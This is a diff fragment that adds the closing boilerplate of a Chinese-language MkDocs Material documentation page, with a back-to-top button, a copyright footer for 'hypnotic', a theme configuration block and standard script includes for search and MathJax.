+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2024 hypnotic
+    </div>
+  
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["header.autohide", "navigation.instant", "navigation.tracking", "content.code.annotate", "toc.integrate", "toc.follow", "navigation.path", "navigation.top", "navigation.tabs", "navigation.prune", "navigation.footer", "navigation.tabs.sticky", "navigation.sections", "content.code.copy", "navigation.indexes", "search.share", "search.suggest", "search.highlight"], "search": "../../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.83f73b43.min.js"></script>
+      
+        <script src="../../../javascripts/extra.js"></script>
+      
+        <script src="../../../javascripts/mathjax.js"></script>
+      
+        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+    
+  </body>
+</html>
